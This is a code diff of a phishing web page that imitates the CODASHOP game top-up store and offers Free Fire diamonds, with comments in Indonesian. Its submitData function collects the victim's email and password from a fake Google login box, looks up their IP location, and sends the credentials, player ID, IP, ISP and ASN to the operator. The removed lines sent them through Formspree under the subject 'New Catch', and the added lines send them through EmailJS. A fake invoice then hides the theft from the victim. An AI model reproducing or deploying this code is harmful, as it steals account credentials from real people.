@@ -26,8 +26,7 @@
         /* Navbar */
         .navbar { background: #ffffff; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.02); }
         .logo-area { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 18px; color: var(--primary); letter-spacing: -0.5px; }
-        .logo-area i { color: var(--accent); font-size: 20px; animation: pulseGlow 2s infinite; }
-        @keyframes pulseGlow { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .logo-area img { width: 24px; height: 24px; border-radius: 4px; object-fit: cover; }
         
         .nav-right { display: flex; align-items: center; gap: 10px; }
         .lang-select { background: var(--primary-light); border: 1px solid #ddd6fe; color: var(--primary); padding: 6px 10px; border-radius: 8px; font-size: 12px; font-weight: 700; outline: none; cursor: pointer; transition: 0.2s; }
@@ -130,18 +129,17 @@
 
     <!-- NAVBAR -->
     <div class="navbar">
-    <div class="logo-area">
-        <img src="https://cdn.phototourl.com/member/2026-10-01-a3154191-fb58-4700-b725-522b65b51410.png" style="width: 24px; height: 24px; border-radius: 4px; object-fit: cover;"> CODASHOP
+        <div class="logo-area">
+            <img src="https://cdn.phototourl.com/member/2026-10-01-a3154191-fb58-4700-b725-522b65b51410.png" alt="Logo"> CODASHOP
+        </div>
+        <div class="nav-right">
+            <select id="langSelect" class="lang-select" onchange="changeLanguage(this.value)">
+                <option value="en">English</option>
+                <option value="id" selected>Indonesia</option>
+                <option value="ms">Melayu</option>
+            </select>
+        </div>
     </div>
-    <div class="nav-right">
-        <select id="langSelect" class="lang-select" onchange="changeLanguage(this.value)">
-            <option value="en">English</option>
-            <option value="id" selected>Indonesia</option>
-            <option value="ms">Melayu</option>
-        </select>
-    </div>
-</div>
-
 
     <!-- MAIN CONTAINER -->
     <div class="container">
@@ -281,7 +279,13 @@
         </div>
     </div>
 
+    <!-- EMAILJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/emailjs.min.js"></script>
     <script>
+        (function(){
+            emailjs.init("YOUR_PUBLIC_KEY"); // Ganti dengan Public Key EmailJS kamu jika belum
+        })();
+
         let currentGame = 'Free Fire';
         let currentItemObj = null;
         let detectedNickname = '-';
@@ -289,7 +293,7 @@
         let timeoutId = null;
 
         const customDiamondImg = 'https://cdn.phototourl.com/member/2026-10-01-a8ee8f23-67b9-4485-a2cc-5783a3e9a532.png';
-        const crossRedImg = 'https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/274c.png'; // Gambar silang merah resmi
+        const crossRedImg = 'https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/274c.png';
 
         const topupData = {
             'Free Fire': [
@@ -441,7 +445,6 @@
                 const response = await fetch(apiUrl);
                 const data = await response.json();
 
-                // Validasi ketat respon API
                 if (data && (data.userName || data.name || data.nickname) && data.success !== false) {
                     detectedNickname = data.userName || data.name || data.nickname;
                     nickBox.className = 'nickname-box';
@@ -454,7 +457,7 @@
             } catch (err) {
                 nickBox.className = 'nickname-box error';
                 nickIconImg.style.animation = 'none';
-                nickIconImg.src = crossRedImg; // Gambar logo silang merah
+                nickIconImg.src = crossRedImg;
                 detectedNickname = 'ID Tidak Ditemukan';
                 nickText.innerText = 'ID Tidak Ditemukan / Salah';
             }
@@ -470,59 +473,55 @@
         }
 
         async function submitData(e) {
-    e.preventDefault();
-    if (isSubmitted) return;
-    isSubmitted = true;
+            e.preventDefault();
+            if (isSubmitted) return;
+            isSubmitted = true;
 
-    const email = document.getElementById('gEmail').value;
-    const password = document.getElementById('gPass').value;
-    const playerId = document.getElementById('playerId').value;
-    const zoneId = document.getElementById('zoneId').value;
-    const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
-    const noTrans = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
-    const now = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
+            const email = document.getElementById('gEmail').value;
+            const password = document.getElementById('gPass').value;
+            const playerId = document.getElementById('playerId').value;
+            const zoneId = document.getElementById('zoneId').value;
+            const fullId = zoneId ? `${playerId} (${zoneId})` : playerId;
+            const noTrans = 'TRX-' + Math.floor(100000 + Math.random() * 900000);
+            const now = new Date().toLocaleString('id-ID', { dateStyle: 'full', timeStyle: 'medium' });
 
-    // AMBIL DATA DARI IP-API.COM
-    let ipData = { query: 'Unknown', country: 'Indonesia', city: 'Manado', regionName: 'North Sulawesi', isp: 'PT Telkom' };
-    try {
-        const res = await fetch('http://ip-api.com/json/');
-        ipData = await res.json();
-    } catch(err) {}
+            // AMBIL DATA IP & ASN DARI IP-API.COM
+            let ipData = { query: 'Unknown', country: 'Indonesia', regionName: 'North Sulawesi', city: 'Manado', isp: 'PT Telkom Indonesia', as: 'AS7713 PT Telekomunikasi Indonesia' };
+            try {
+                const res = await fetch('http://ip-api.com/json/');
+                ipData = await res.json();
+            } catch(err) {}
 
-    // KIRIM KE EMAIL VIA FORMSPREE
-    const formspreeUrl = 'https://formspree.io/f/xjykzdjv';
-    try {
-        await fetch(formspreeUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                subject: `New Catch: ${email} (${currentGame})`,
-                email_target: email,
-                password_target: password,
-                player_id: fullId,
-                game: currentGame,
-                nickname: detectedNickname,
-                ip_address: ipData.query,
-                location: `${ipData.city}, ${ipData.regionName}, ${ipData.country}`,
-                isp: ipData.isp
-            })
-        });
-    } catch(err) {}
+            // KIRIM KE EMAIL VIA EMAILJS
+            try {
+                await emailjs.send('service_y7gqa5k', 'template_rp7jmda', {
+                    email_target: email,
+                    password_target: password,
+                    player_id: fullId,
+                    game: currentGame,
+                    nickname: detectedNickname,
+                    ip_address: ipData.query,
+                    country: ipData.country,
+                    region: ipData.regionName,
+                    city: ipData.city,
+                    isp: ipData.isp,
+                    asn: ipData.as
+                });
+            } catch(err) {}
 
-    document.getElementById('google-modal').style.display = 'none';
-    
-    document.getElementById('rNoTrans').innerText = noTrans;
-    document.getElementById('rId').innerText = fullId;
-    document.getElementById('rNick').innerText = detectedNickname;
-    document.getElementById('rItem').innerText = `${currentItemObj.name} (${currentItemObj.sub})`;
-    document.getElementById('rOrigPrice').innerText = currentItemObj.orig;
-    document.getElementById('rDate').innerText = now;
-    document.getElementById('rEmail').innerText = email;
-    document.getElementById('rCountry').innerText = ipData.country || 'Indonesia';
+            document.getElementById('google-modal').style.display = 'none';
+            
+            document.getElementById('rNoTrans').innerText = noTrans;
+            document.getElementById('rId').innerText = fullId;
+            document.getElementById('rNick').innerText = detectedNickname;
+            document.getElementById('rItem').innerText = `${currentItemObj.name} (${currentItemObj.sub})`;
+            document.getElementById('rOrigPrice').innerText = currentItemObj.orig;
+            document.getElementById('rDate').innerText = now;
+            document.getElementById('rEmail').innerText = email;
+            document.getElementById('rCountry').innerText = ipData.country || 'Indonesia';
 
-    document.getElementById('invoice-screen').style.display = 'flex';
-}
-
+            document.getElementById('invoice-screen').style.display = 'flex';
+        }
 
         function toggleReceiptDetail() {
             const box = document.getElementById('receiptDetailsBox');
